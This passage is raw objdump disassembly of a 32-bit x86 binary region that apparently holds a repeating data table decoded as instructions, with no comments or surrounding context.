  408550:	00 00                	add    %al,(%eax)
  408552:	00 2a                	add    %ch,(%edx)
  408554:	2a 00                	sub    (%eax),%al
  408556:	00 00                	add    %al,(%eax)
  408558:	01 00                	add    %eax,(%eax)
  40855a:	00 00                	add    %al,(%eax)
  40855c:	4f                   	dec    %edi
  40855d:	4f                   	dec    %edi
  40855e:	00 00                	add    %al,(%eax)
  408560:	00 01                	add    %al,(%ecx)
  408562:	00 00                	add    %al,(%eax)
  408564:	00 21                	add    %ah,(%ecx)
  408566:	21 00                	and    %eax,(%eax)
  408568:	00 00                	add    %al,(%eax)
  40856a:	12 13                	adc    (%ebx),%dl
  40856c:	0e                   	push   %cs
  40856d:	00 00                	add    %al,(%eax)
  40856f:	00 07                	add    %al,(%edi)
  408571:	07                   	pop    %es
  408572:	00 00                	add    %al,(%eax)
  408574:	00 01                	add    %al,(%ecx)
	...
  40857e:	11 01                	adc    %eax,(%ecx)
  408580:	00 00                	add    %al,(%eax)
  408582:	00 2b                	add    %ch,(%ebx)
  408584:	2b 00                	sub    (%eax),%eax
  408586:	00 00                	add    %al,(%eax)
  408588:	01 00                	add    %eax,(%eax)
  40858a:	00 00                	add    %al,(%eax)
  40858c:	e1 e1                	loope  0x40856f
  40858e:	00 00                	add    %al,(%eax)
  408590:	00 01                	add    %al,(%ecx)
  408592:	00 00                	add    %al,(%eax)
  408594:	00 c1                	add    %al,%cl
  408596:	c1 00 00             	roll   $0x0,(%eax)
  408599:	00 12                	add    %dl,(%edx)
  40859b:	13 0e                	adc    (%esi),%ecx
  40859d:	00 00                	add    %al,(%eax)
  40859f:	00 07                	add    %al,(%edi)
  4085a1:	07                   	pop    %es
  4085a2:	00 00                	add    %al,(%eax)
  4085a4:	00 01                	add    %al,(%ecx)
	...
  4085ae:	11 01                	adc    %eax,(%ecx)
  4085b0:	00 00                	add    %al,(%eax)
  4085b2:	00 2c 2c             	add    %ch,(%esp,%ebp,1)
  4085b5:	00 00                	add    %al,(%eax)
  4085b7:	00 01                	add    %al,(%ecx)
  4085b9:	00 00                	add    %al,(%eax)
  4085bb:	00 b2 b2 00 00 00    	add    %dh,0xb2(%edx)
  4085c1:	01 00                	add    %eax,(%eax)
  4085c3:	00 00                	add    %al,(%eax)
  4085c5:	dd dd                	fstp   %st(5)
  4085c7:	00 00                	add    %al,(%eax)
  4085c9:	00 12                	add    %dl,(%edx)
  4085cb:	13 0e                	adc    (%esi),%ecx
  4085cd:	00 00                	add    %al,(%eax)
  4085cf:	00 07                	add    %al,(%edi)
  4085d1:	07                   	pop    %es
  4085d2:	00 00                	add    %al,(%eax)
  4085d4:	00 01                	add    %al,(%ecx)
	...
  4085de:	11 01                	adc    %eax,(%ecx)
  4085e0:	00 00                	add    %al,(%eax)
  4085e2:	00 2d 2d 00 00 00    	add    %ch,0x2d
  4085e8:	1b 00                	sbb    (%eax),%eax
  4085ea:	00 00                	add    %al,(%eax)
  4085ec:	06                   	push   %es
  4085ed:	06                   	push   %es
  4085ee:	00 00                	add    %al,(%eax)
  4085f0:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4085f3:	00 00                	add    %al,(%eax)
  4085f5:	00 2d 2d 00 00 00    	add    %ch,0x2d
  4085fb:	16                   	push   %ss
  4085fc:	17                   	pop    %ss
  4085fd:	18 01                	sbb    %al,(%ecx)
  4085ff:	00 00                	add    %al,(%eax)
  408601:	00 4f 4f             	add    %cl,0x4f(%edi)
  408604:	00 00                	add    %al,(%eax)
  408606:	00 12                	add    %dl,(%edx)
  408608:	13 0e                	adc    (%esi),%ecx
  40860a:	00 00                	add    %al,(%eax)
  40860c:	00 07                	add    %al,(%edi)
  40860e:	07                   	pop    %es
  40860f:	00 00                	add    %al,(%eax)
  408611:	00 01                	add    %al,(%ecx)
	...
  40861b:	11 01                	adc    %eax,(%ecx)
  40861d:	00 00                	add    %al,(%eax)
  40861f:	00 2e                	add    %ch,(%esi)
  408621:	2e 00 00             	add    %al,%cs:(%eax)
  408624:	00 1b                	add    %bl,(%ebx)
  408626:	00 00                	add    %al,(%eax)
  408628:	00 06                	add    %al,(%esi)
  40862a:	06                   	push   %es
  40862b:	00 00                	add    %al,(%eax)
  40862d:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408630:	00 00                	add    %al,(%eax)
  408632:	00 2e                	add    %ch,(%esi)
  408634:	2e 00 00             	add    %al,%cs:(%eax)
  408637:	00 16                	add    %dl,(%esi)
  408639:	17                   	pop    %ss
  40863a:	18 01                	sbb    %al,(%ecx)
  40863c:	00 00                	add    %al,(%eax)
  40863e:	00 c8                	add    %cl,%al
  408640:	c8 00 00 00          	enter  $0x0,$0x0
  408644:	12 13                	adc    (%ebx),%dl
  408646:	0e                   	push   %cs
  408647:	00 00                	add    %al,(%eax)
  408649:	00 07                	add    %al,(%edi)
  40864b:	07                   	pop    %es
  40864c:	00 00                	add    %al,(%eax)
  40864e:	00 01                	add    %al,(%ecx)
	...
  408658:	11 01                	adc    %eax,(%ecx)
  40865a:	00 00                	add    %al,(%eax)
  40865c:	00 2f                	add    %ch,(%edi)
  40865e:	2f                   	das
  40865f:	00 00                	add    %al,(%eax)
  408661:	00 1b                	add    %bl,(%ebx)
  408663:	00 00                	add    %al,(%eax)
  408665:	00 06                	add    %al,(%esi)
  408667:	06                   	push   %es
  408668:	00 00                	add    %al,(%eax)
  40866a:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  40866d:	00 00                	add    %al,(%eax)
  40866f:	00 2f                	add    %ch,(%edi)
  408671:	2f                   	das
  408672:	00 00                	add    %al,(%eax)
  408674:	00 16                	add    %dl,(%esi)
  408676:	17                   	pop    %ss
  408677:	18 01                	sbb    %al,(%ecx)
  408679:	00 00                	add    %al,(%eax)
  40867b:	00 0f                	add    %cl,(%edi)
  40867d:	0f 00 00             	sldt   (%eax)
  408680:	00 12                	add    %dl,(%edx)
  408682:	13 0e                	adc    (%esi),%ecx
  408684:	00 00                	add    %al,(%eax)
  408686:	00 07                	add    %al,(%edi)
  408688:	07                   	pop    %es
  408689:	00 00                	add    %al,(%eax)
  40868b:	00 01                	add    %al,(%ecx)
	...
  408695:	11 01                	adc    %eax,(%ecx)
  408697:	00 00                	add    %al,(%eax)
  408699:	00 30                	add    %dh,(%eax)
  40869b:	30 00                	xor    %al,(%eax)
  40869d:	00 00                	add    %al,(%eax)
  40869f:	01 00                	add    %eax,(%eax)
  4086a1:	00 00                	add    %al,(%eax)
  4086a3:	cc                   	int3
  4086a4:	cc                   	int3
  4086a5:	00 00                	add    %al,(%eax)
  4086a7:	00 01                	add    %al,(%ecx)
  4086a9:	00 00                	add    %al,(%eax)
  4086ab:	00 be be 00 00 00    	add    %bh,0xbe(%esi)
  4086b1:	12 13                	adc    (%ebx),%dl
  4086b3:	0e                   	push   %cs
  4086b4:	00 00                	add    %al,(%eax)
  4086b6:	00 07                	add    %al,(%edi)
  4086b8:	07                   	pop    %es
  4086b9:	00 00                	add    %al,(%eax)
  4086bb:	00 01                	add    %al,(%ecx)
	...
  4086c5:	11 01                	adc    %eax,(%ecx)
  4086c7:	00 00                	add    %al,(%eax)
  4086c9:	00 31                	add    %dh,(%ecx)
  4086cb:	31 00                	xor    %eax,(%eax)
  4086cd:	00 00                	add    %al,(%eax)
  4086cf:	01 00                	add    %eax,(%eax)
  4086d1:	00 00                	add    %al,(%eax)
  4086d3:	0d 0d 00 00 00       	or     $0xd,%eax
  4086d8:	01 00                	add    %eax,(%eax)
  4086da:	00 00                	add    %al,(%eax)
  4086dc:	60                   	pusha
  4086dd:	60                   	pusha
  4086de:	00 00                	add    %al,(%eax)
  4086e0:	00 12                	add    %dl,(%edx)
  4086e2:	13 0e                	adc    (%esi),%ecx
  4086e4:	00 00                	add    %al,(%eax)
  4086e6:	00 07                	add    %al,(%edi)
  4086e8:	07                   	pop    %es
  4086e9:	00 00                	add    %al,(%eax)
  4086eb:	00 01                	add    %al,(%ecx)
	...
  4086f5:	11 01                	adc    %eax,(%ecx)
  4086f7:	00 00                	add    %al,(%eax)
  4086f9:	00 32                	add    %dh,(%edx)
  4086fb:	32 00                	xor    (%eax),%al
  4086fd:	00 00                	add    %al,(%eax)
  4086ff:	1b 00                	sbb    (%eax),%eax
  408701:	00 00                	add    %al,(%eax)
  408703:	06                   	push   %es
  408704:	06                   	push   %es
  408705:	00 00                	add    %al,(%eax)
  408707:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  40870a:	00 00                	add    %al,(%eax)
  40870c:	00 32                	add    %dh,(%edx)
  40870e:	32 00                	xor    (%eax),%al
  408710:	00 00                	add    %al,(%eax)
  408712:	16                   	push   %ss
  408713:	17                   	pop    %ss
  408714:	18 01                	sbb    %al,(%ecx)
  408716:	00 00                	add    %al,(%eax)
  408718:	00 7e 7e             	add    %bh,0x7e(%esi)
  40871b:	00 00                	add    %al,(%eax)
  40871d:	00 12                	add    %dl,(%edx)
  40871f:	13 0e                	adc    (%esi),%ecx
  408721:	00 00                	add    %al,(%eax)
  408723:	00 07                	add    %al,(%edi)
  408725:	07                   	pop    %es
  408726:	00 00                	add    %al,(%eax)
  408728:	00 01                	add    %al,(%ecx)
	...
  408732:	11 01                	adc    %eax,(%ecx)
  408734:	00 00                	add    %al,(%eax)
  408736:	00 33                	add    %dh,(%ebx)
  408738:	33 00                	xor    (%eax),%eax
  40873a:	00 00                	add    %al,(%eax)
  40873c:	1b 00                	sbb    (%eax),%eax
  40873e:	00 00                	add    %al,(%eax)
  408740:	06                   	push   %es
  408741:	06                   	push   %es
  408742:	00 00                	add    %al,(%eax)
  408744:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408747:	00 00                	add    %al,(%eax)
  408749:	00 33                	add    %dh,(%ebx)
  40874b:	33 00                	xor    (%eax),%eax
  40874d:	00 00                	add    %al,(%eax)
  40874f:	16                   	push   %ss
  408750:	17                   	pop    %ss
  408751:	18 01                	sbb    %al,(%ecx)
  408753:	00 00                	add    %al,(%eax)
  408755:	00 75 75             	add    %dh,0x75(%ebp)
  408758:	00 00                	add    %al,(%eax)
  40875a:	00 12                	add    %dl,(%edx)
  40875c:	13 0e                	adc    (%esi),%ecx
  40875e:	00 00                	add    %al,(%eax)
  408760:	00 07                	add    %al,(%edi)
  408762:	07                   	pop    %es
  408763:	00 00                	add    %al,(%eax)
  408765:	00 01                	add    %al,(%ecx)
	...
  40876f:	11 01                	adc    %eax,(%ecx)
  408771:	00 00                	add    %al,(%eax)
  408773:	00 34 34             	add    %dh,(%esp,%esi,1)
  408776:	00 00                	add    %al,(%eax)
  408778:	00 01                	add    %al,(%ecx)
  40877a:	00 00                	add    %al,(%eax)
  40877c:	00 9d 9d 00 00 00    	add    %bl,0x9d(%ebp)
  408782:	01 00                	add    %eax,(%eax)
  408784:	00 00                	add    %al,(%eax)
  408786:	e9 e9 00 00 00       	jmp    0x408874
  40878b:	12 13                	adc    (%ebx),%dl
  40878d:	0e                   	push   %cs
  40878e:	00 00                	add    %al,(%eax)
  408790:	00 07                	add    %al,(%edi)
  408792:	07                   	pop    %es
  408793:	00 00                	add    %al,(%eax)
  408795:	00 01                	add    %al,(%ecx)
	...
  40879f:	11 01                	adc    %eax,(%ecx)
  4087a1:	00 00                	add    %al,(%eax)
  4087a3:	00 35 35 00 00 00    	add    %dh,0x35
  4087a9:	1b 00                	sbb    (%eax),%eax
  4087ab:	00 00                	add    %al,(%eax)
  4087ad:	06                   	push   %es
  4087ae:	06                   	push   %es
  4087af:	00 00                	add    %al,(%eax)
  4087b1:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4087b4:	00 00                	add    %al,(%eax)
  4087b6:	00 35 35 00 00 00    	add    %dh,0x35
  4087bc:	16                   	push   %ss
  4087bd:	17                   	pop    %ss
  4087be:	18 01                	sbb    %al,(%ecx)
  4087c0:	00 00                	add    %al,(%eax)
  4087c2:	00 20                	add    %ah,(%eax)
  4087c4:	20 00                	and    %al,(%eax)
  4087c6:	00 00                	add    %al,(%eax)
  4087c8:	12 13                	adc    (%ebx),%dl
  4087ca:	0e                   	push   %cs
  4087cb:	00 00                	add    %al,(%eax)
  4087cd:	00 07                	add    %al,(%edi)
  4087cf:	07                   	pop    %es
  4087d0:	00 00                	add    %al,(%eax)
  4087d2:	00 01                	add    %al,(%ecx)
	...
  4087dc:	11 01                	adc    %eax,(%ecx)
  4087de:	00 00                	add    %al,(%eax)
  4087e0:	00 36                	add    %dh,(%esi)
  4087e2:	36 00 00             	add    %al,%ss:(%eax)
  4087e5:	00 1b                	add    %bl,(%ebx)
  4087e7:	00 00                	add    %al,(%eax)
  4087e9:	00 06                	add    %al,(%esi)
  4087eb:	06                   	push   %es
  4087ec:	00 00                	add    %al,(%eax)
  4087ee:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4087f1:	00 00                	add    %al,(%eax)
  4087f3:	00 36                	add    %dh,(%esi)
  4087f5:	36 00 00             	add    %al,%ss:(%eax)
  4087f8:	00 16                	add    %dl,(%esi)
  4087fa:	17                   	pop    %ss
  4087fb:	18 01                	sbb    %al,(%ecx)
  4087fd:	00 00                	add    %al,(%eax)
  4087ff:	00 b2 b2 00 00 00    	add    %dh,0xb2(%edx)
  408805:	12 13                	adc    (%ebx),%dl
  408807:	0e                   	push   %cs
  408808:	00 00                	add    %al,(%eax)
  40880a:	00 07                	add    %al,(%edi)
  40880c:	07                   	pop    %es
  40880d:	00 00                	add    %al,(%eax)
  40880f:	00 01                	add    %al,(%ecx)
	...
  408819:	11 01                	adc    %eax,(%ecx)
  40881b:	00 00                	add    %al,(%eax)
  40881d:	00 37                	add    %dh,(%edi)
  40881f:	37                   	aaa
  408820:	00 00                	add    %al,(%eax)
  408822:	00 1b                	add    %bl,(%ebx)
  408824:	00 00                	add    %al,(%eax)
  408826:	00 06                	add    %al,(%esi)
  408828:	06                   	push   %es
  408829:	00 00                	add    %al,(%eax)
  40882b:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  40882e:	00 00                	add    %al,(%eax)
  408830:	00 37                	add    %dh,(%edi)
  408832:	37                   	aaa
  408833:	00 00                	add    %al,(%eax)
  408835:	00 16                	add    %dl,(%esi)
  408837:	17                   	pop    %ss
  408838:	18 01                	sbb    %al,(%ecx)
  40883a:	00 00                	add    %al,(%eax)
  40883c:	00 eb                	add    %ch,%bl
  40883e:	eb 00                	jmp    0x408840
  408840:	00 00                	add    %al,(%eax)
  408842:	12 13                	adc    (%ebx),%dl
  408844:	0e                   	push   %cs
  408845:	00 00                	add    %al,(%eax)
  408847:	00 07                	add    %al,(%edi)
  408849:	07                   	pop    %es
  40884a:	00 00                	add    %al,(%eax)
  40884c:	00 01                	add    %al,(%ecx)
	...
  408856:	11 01                	adc    %eax,(%ecx)
  408858:	00 00                	add    %al,(%eax)
  40885a:	00 38                	add    %bh,(%eax)
  40885c:	38 00                	cmp    %al,(%eax)
  40885e:	00 00                	add    %al,(%eax)
  408860:	1b 00                	sbb    (%eax),%eax
  408862:	00 00                	add    %al,(%eax)
  408864:	06                   	push   %es
  408865:	06                   	push   %es
  408866:	00 00                	add    %al,(%eax)
  408868:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  40886b:	00 00                	add    %al,(%eax)
  40886d:	00 38                	add    %bh,(%eax)
  40886f:	38 00                	cmp    %al,(%eax)
  408871:	00 00                	add    %al,(%eax)
  408873:	16                   	push   %ss
  408874:	17                   	pop    %ss
  408875:	18 01                	sbb    %al,(%ecx)
  408877:	00 00                	add    %al,(%eax)
  408879:	00 d9                	add    %bl,%cl
  40887b:	d9 00                	flds   (%eax)
  40887d:	00 00                	add    %al,(%eax)
  40887f:	12 13                	adc    (%ebx),%dl
  408881:	0e                   	push   %cs
  408882:	00 00                	add    %al,(%eax)
  408884:	00 07                	add    %al,(%edi)
  408886:	07                   	pop    %es
  408887:	00 00                	add    %al,(%eax)
  408889:	00 01                	add    %al,(%ecx)
	...
  408893:	11 01                	adc    %eax,(%ecx)
  408895:	00 00                	add    %al,(%eax)
  408897:	00 39                	add    %bh,(%ecx)
  408899:	39 00                	cmp    %eax,(%eax)
  40889b:	00 00                	add    %al,(%eax)
  40889d:	1b 00                	sbb    (%eax),%eax
  40889f:	00 00                	add    %al,(%eax)
  4088a1:	06                   	push   %es
  4088a2:	06                   	push   %es
  4088a3:	00 00                	add    %al,(%eax)
  4088a5:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4088a8:	00 00                	add    %al,(%eax)
  4088aa:	00 39                	add    %bh,(%ecx)
  4088ac:	39 00                	cmp    %eax,(%eax)
  4088ae:	00 00                	add    %al,(%eax)
  4088b0:	16                   	push   %ss
  4088b1:	17                   	pop    %ss
  4088b2:	18 01                	sbb    %al,(%ecx)
  4088b4:	00 00                	add    %al,(%eax)
  4088b6:	00 71 71             	add    %dh,0x71(%ecx)
  4088b9:	00 00                	add    %al,(%eax)
  4088bb:	00 12                	add    %dl,(%edx)
  4088bd:	13 0e                	adc    (%esi),%ecx
  4088bf:	00 00                	add    %al,(%eax)
  4088c1:	00 07                	add    %al,(%edi)
  4088c3:	07                   	pop    %es
  4088c4:	00 00                	add    %al,(%eax)
  4088c6:	00 01                	add    %al,(%ecx)
	...
  4088d0:	11 01                	adc    %eax,(%ecx)
  4088d2:	00 00                	add    %al,(%eax)
  4088d4:	00 3a                	add    %bh,(%edx)
  4088d6:	3a 00                	cmp    (%eax),%al
  4088d8:	00 00                	add    %al,(%eax)
  4088da:	01 00                	add    %eax,(%eax)
  4088dc:	00 00                	add    %al,(%eax)
  4088de:	41                   	inc    %ecx
  4088df:	41                   	inc    %ecx
  4088e0:	00 00                	add    %al,(%eax)
  4088e2:	00 01                	add    %al,(%ecx)
  4088e4:	00 00                	add    %al,(%eax)
  4088e6:	00 61 61             	add    %ah,0x61(%ecx)
  4088e9:	00 00                	add    %al,(%eax)
  4088eb:	00 12                	add    %dl,(%edx)
  4088ed:	13 0e                	adc    (%esi),%ecx
  4088ef:	00 00                	add    %al,(%eax)
  4088f1:	00 07                	add    %al,(%edi)
  4088f3:	07                   	pop    %es
  4088f4:	00 00                	add    %al,(%eax)
  4088f6:	00 01                	add    %al,(%ecx)
	...
  408900:	11 01                	adc    %eax,(%ecx)
  408902:	00 00                	add    %al,(%eax)
  408904:	00 3b                	add    %bh,(%ebx)
  408906:	3b 00                	cmp    (%eax),%eax
  408908:	00 00                	add    %al,(%eax)
  40890a:	01 00                	add    %eax,(%eax)
  40890c:	00 00                	add    %al,(%eax)
  40890e:	d9 d9                	(bad)
  408910:	00 00                	add    %al,(%eax)
  408912:	00 01                	add    %al,(%ecx)
  408914:	00 00                	add    %al,(%eax)
  408916:	00 ad ad 00 00 00    	add    %ch,0xad(%ebp)
  40891c:	12 13                	adc    (%ebx),%dl
  40891e:	0e                   	push   %cs
  40891f:	00 00                	add    %al,(%eax)
  408921:	00 07                	add    %al,(%edi)
  408923:	07                   	pop    %es
  408924:	00 00                	add    %al,(%eax)
  408926:	00 01                	add    %al,(%ecx)
	...
  408930:	11 01                	adc    %eax,(%ecx)
  408932:	00 00                	add    %al,(%eax)
  408934:	00 3c 3c             	add    %bh,(%esp,%edi,1)
  408937:	00 00                	add    %al,(%eax)
  408939:	00 01                	add    %al,(%ecx)
  40893b:	00 00                	add    %al,(%eax)
  40893d:	00 91 91 00 00 00    	add    %dl,0x91(%ecx)
  408943:	01 00                	add    %eax,(%eax)
  408945:	00 00                	add    %al,(%eax)
  408947:	f9                   	stc
  408948:	f9                   	stc
  408949:	00 00                	add    %al,(%eax)
  40894b:	00 12                	add    %dl,(%edx)
  40894d:	13 0e                	adc    (%esi),%ecx
  40894f:	00 00                	add    %al,(%eax)
  408951:	00 07                	add    %al,(%edi)
  408953:	07                   	pop    %es
  408954:	00 00                	add    %al,(%eax)
  408956:	00 01                	add    %al,(%ecx)
	...
  408960:	11 01                	adc    %eax,(%ecx)
  408962:	00 00                	add    %al,(%eax)
  408964:	00 3d 3d 00 00 00    	add    %bh,0x3d
  40896a:	1b 00                	sbb    (%eax),%eax
  40896c:	00 00                	add    %al,(%eax)
  40896e:	06                   	push   %es
  40896f:	06                   	push   %es
  408970:	00 00                	add    %al,(%eax)
  408972:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408975:	00 00                	add    %al,(%eax)
  408977:	00 3d 3d 00 00 00    	add    %bh,0x3d
  40897d:	16                   	push   %ss
  40897e:	17                   	pop    %ss
  40897f:	18 01                	sbb    %al,(%ecx)
  408981:	00 00                	add    %al,(%eax)
  408983:	00 bc bc 00 00 00 12 	add    %bh,0x12000000(%esp,%edi,4)
  40898a:	13 0e                	adc    (%esi),%ecx
  40898c:	00 00                	add    %al,(%eax)
  40898e:	00 07                	add    %al,(%edi)
  408990:	07                   	pop    %es
  408991:	00 00                	add    %al,(%eax)
  408993:	00 01                	add    %al,(%ecx)
	...
  40899d:	11 01                	adc    %eax,(%ecx)
  40899f:	00 00                	add    %al,(%eax)
  4089a1:	00 3e                	add    %bh,(%esi)
  4089a3:	3e 00 00             	add    %al,%ds:(%eax)
  4089a6:	00 01                	add    %al,(%ecx)
  4089a8:	00 00                	add    %al,(%eax)
  4089aa:	00 60 60             	add    %ah,0x60(%eax)
  4089ad:	00 00                	add    %al,(%eax)
  4089af:	00 01                	add    %al,(%ecx)
  4089b1:	00 00                	add    %al,(%eax)
  4089b3:	00 0e                	add    %cl,(%esi)
  4089b5:	0e                   	push   %cs
  4089b6:	00 00                	add    %al,(%eax)
  4089b8:	00 12                	add    %dl,(%edx)
  4089ba:	13 0e                	adc    (%esi),%ecx
  4089bc:	00 00                	add    %al,(%eax)
  4089be:	00 07                	add    %al,(%edi)
  4089c0:	07                   	pop    %es
  4089c1:	00 00                	add    %al,(%eax)
  4089c3:	00 01                	add    %al,(%ecx)
	...
  4089cd:	11 01                	adc    %eax,(%ecx)
  4089cf:	00 00                	add    %al,(%eax)
  4089d1:	00 3f                	add    %bh,(%edi)
  4089d3:	3f                   	aas
  4089d4:	00 00                	add    %al,(%eax)
  4089d6:	00 1b                	add    %bl,(%ebx)
  4089d8:	00 00                	add    %al,(%eax)
  4089da:	00 06                	add    %al,(%esi)
  4089dc:	06                   	push   %es
  4089dd:	00 00                	add    %al,(%eax)
  4089df:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4089e2:	00 00                	add    %al,(%eax)
  4089e4:	00 3f                	add    %bh,(%edi)
  4089e6:	3f                   	aas
  4089e7:	00 00                	add    %al,(%eax)
  4089e9:	00 16                	add    %dl,(%esi)
  4089eb:	17                   	pop    %ss
  4089ec:	18 01                	sbb    %al,(%ecx)
  4089ee:	00 00                	add    %al,(%eax)
  4089f0:	00 b4 b4 00 00 00 12 	add    %dh,0x12000000(%esp,%esi,4)
  4089f7:	13 0e                	adc    (%esi),%ecx
  4089f9:	00 00                	add    %al,(%eax)
  4089fb:	00 07                	add    %al,(%edi)
  4089fd:	07                   	pop    %es
  4089fe:	00 00                	add    %al,(%eax)
  408a00:	00 01                	add    %al,(%ecx)
	...
  408a0a:	11 01                	adc    %eax,(%ecx)
  408a0c:	00 00                	add    %al,(%eax)
  408a0e:	00 40 40             	add    %al,0x40(%eax)
  408a11:	00 00                	add    %al,(%eax)
  408a13:	00 01                	add    %al,(%ecx)
  408a15:	00 00                	add    %al,(%eax)
  408a17:	00 17                	add    %dl,(%edi)
  408a19:	17                   	pop    %ss
  408a1a:	00 00                	add    %al,(%eax)
  408a1c:	00 01                	add    %al,(%ecx)
  408a1e:	00 00                	add    %al,(%eax)
  408a20:	00 20                	add    %ah,(%eax)
  408a22:	20 00                	and    %al,(%eax)
  408a24:	00 00                	add    %al,(%eax)
  408a26:	12 13                	adc    (%ebx),%dl
  408a28:	0e                   	push   %cs
  408a29:	00 00                	add    %al,(%eax)
  408a2b:	00 07                	add    %al,(%edi)
  408a2d:	07                   	pop    %es
  408a2e:	00 00                	add    %al,(%eax)
  408a30:	00 01                	add    %al,(%ecx)
	...
  408a3a:	11 01                	adc    %eax,(%ecx)
  408a3c:	00 00                	add    %al,(%eax)
  408a3e:	00 41 41             	add    %al,0x41(%ecx)
  408a41:	00 00                	add    %al,(%eax)
  408a43:	00 1b                	add    %bl,(%ebx)
  408a45:	00 00                	add    %al,(%eax)
  408a47:	00 06                	add    %al,(%esi)
  408a49:	06                   	push   %es
  408a4a:	00 00                	add    %al,(%eax)
  408a4c:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408a4f:	00 00                	add    %al,(%eax)
  408a51:	00 41 41             	add    %al,0x41(%ecx)
  408a54:	00 00                	add    %al,(%eax)
  408a56:	00 16                	add    %dl,(%esi)
  408a58:	17                   	pop    %ss
  408a59:	18 01                	sbb    %al,(%ecx)
  408a5b:	00 00                	add    %al,(%eax)
  408a5d:	00 ea                	add    %ch,%dl
  408a5f:	ea 00 00 00 12 13 0e 	ljmp   $0xe13,$0x12000000
  408a66:	00 00                	add    %al,(%eax)
  408a68:	00 07                	add    %al,(%edi)
  408a6a:	07                   	pop    %es
  408a6b:	00 00                	add    %al,(%eax)
  408a6d:	00 01                	add    %al,(%ecx)
	...
  408a77:	11 01                	adc    %eax,(%ecx)
  408a79:	00 00                	add    %al,(%eax)
  408a7b:	00 42 42             	add    %al,0x42(%edx)
  408a7e:	00 00                	add    %al,(%eax)
  408a80:	00 01                	add    %al,(%ecx)
  408a82:	00 00                	add    %al,(%eax)
  408a84:	00 f4                	add    %dh,%ah
  408a86:	f4                   	hlt
  408a87:	00 00                	add    %al,(%eax)
  408a89:	00 01                	add    %al,(%ecx)
  408a8b:	00 00                	add    %al,(%eax)
  408a8d:	00 90 90 00 00 00    	add    %dl,0x90(%eax)
  408a93:	12 13                	adc    (%ebx),%dl
  408a95:	0e                   	push   %cs
  408a96:	00 00                	add    %al,(%eax)
  408a98:	00 07                	add    %al,(%edi)
  408a9a:	07                   	pop    %es
  408a9b:	00 00                	add    %al,(%eax)
  408a9d:	00 01                	add    %al,(%ecx)
	...
  408aa7:	11 01                	adc    %eax,(%ecx)
  408aa9:	00 00                	add    %al,(%eax)
  408aab:	00 43 43             	add    %al,0x43(%ebx)
  408aae:	00 00                	add    %al,(%eax)
  408ab0:	00 01                	add    %al,(%ecx)
  408ab2:	00 00                	add    %al,(%eax)
  408ab4:	00 30                	add    %dh,(%eax)
  408ab6:	30 00                	xor    %al,(%eax)
  408ab8:	00 00                	add    %al,(%eax)
  408aba:	01 00                	add    %eax,(%eax)
  408abc:	00 00                	add    %al,(%eax)
  408abe:	51                   	push   %ecx
  408abf:	51                   	push   %ecx
  408ac0:	00 00                	add    %al,(%eax)
  408ac2:	00 12                	add    %dl,(%edx)
  408ac4:	13 0e                	adc    (%esi),%ecx
  408ac6:	00 00                	add    %al,(%eax)
  408ac8:	00 07                	add    %al,(%edi)
  408aca:	07                   	pop    %es
  408acb:	00 00                	add    %al,(%eax)
  408acd:	00 01                	add    %al,(%ecx)
	...
  408ad7:	11 01                	adc    %eax,(%ecx)
  408ad9:	00 00                	add    %al,(%eax)
  408adb:	00 44 44 00          	add    %al,0x0(%esp,%eax,2)
  408adf:	00 00                	add    %al,(%eax)
  408ae1:	1b 00                	sbb    (%eax),%eax
  408ae3:	00 00                	add    %al,(%eax)
  408ae5:	06                   	push   %es
  408ae6:	06                   	push   %es
  408ae7:	00 00                	add    %al,(%eax)
  408ae9:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  408aec:	00 00                	add    %al,(%eax)
  408aee:	00 44 44 00          	add    %al,0x0(%esp,%eax,2)
  408af2:	00 00                	add    %al,(%eax)
  408af4:	16                   	push   %ss
  408af5:	17                   	pop    %ss
  408af6:	18 01                	sbb    %al,(%ecx)
  408af8:	00 00                	add    %al,(%eax)
  408afa:	00 69 69             	add    %ch,0x69(%ecx)
  408afd:	00 00                	add    %al,(%eax)
  408aff:	00 12                	add    %dl,(%edx)
  408b01:	13 0e                	adc    (%esi),%ecx
  408b03:	00 00                	add    %al,(%eax)
  408b05:	00 07                	add    %al,(%edi)
  408b07:	07                   	pop    %es
  408b08:	00 00                	add    %al,(%eax)
  408b0a:	00 01                	add    %al,(%ecx)
	...
  408b14:	11 01                	adc    %eax,(%ecx)
  408b16:	00 00                	add    %al,(%eax)
  408b18:	00 45 45             	add    %al,0x45(%ebp)
  408b1b:	00 00                	add    %al,(%eax)
  408b1d:	00 01                	add    %al,(%ecx)
  408b1f:	00 00                	add    %al,(%eax)
  408b21:	00 53 53             	add    %dl,0x53(%ebx)
  408b24:	00 00                	add    %al,(%eax)
  408b26:	00 01                	add    %al,(%ecx)
  408b28:	00 00                	add    %al,(%eax)
  408b2a:	00 20                	add    %ah,(%eax)
  408b2c:	20 00                	and    %al,(%eax)
  408b2e:	00 00                	add    %al,(%eax)
  408b30:	12 13                	adc    (%ebx),%dl
  408b32:	0e                   	push   %cs
  408b33:	00 00                	add    %al,(%eax)
  408b35:	00 07                	add    %al,(%edi)
  408b37:	07                   	pop    %es
  408b38:	00 00                	add    %al,(%eax)
  408b3a:	00 01                	add    %al,(%ecx)
	...
  408b44:	11 01                	adc    %eax,(%ecx)
  408b46:	00 00                	add    %al,(%eax)
  408b48:	00 46 46             	add    %al,0x46(%esi)
  408b4b:	00 00                	add    %al,(%eax)
  408b4d:	00 01                	add    %al,(%ecx)
  408b4f:	00 00                	add    %al,(%eax)
  408b51:	00 b8 b8 00 00 00    	add    %bh,0xb8(%eax)
  408b57:	01 00                	add    %eax,(%eax)
  408b59:	00 00                	add    %al,(%eax)
  408b5b:	98                   	cwtl
  408b5c:	98                   	cwtl
  408b5d:	00 00                	add    %al,(%eax)
  408b5f:	00 12                	add    %dl,(%edx)
  408b61:	13 0e                	adc    (%esi),%ecx
  408b63:	00 00                	add    %al,(%eax)
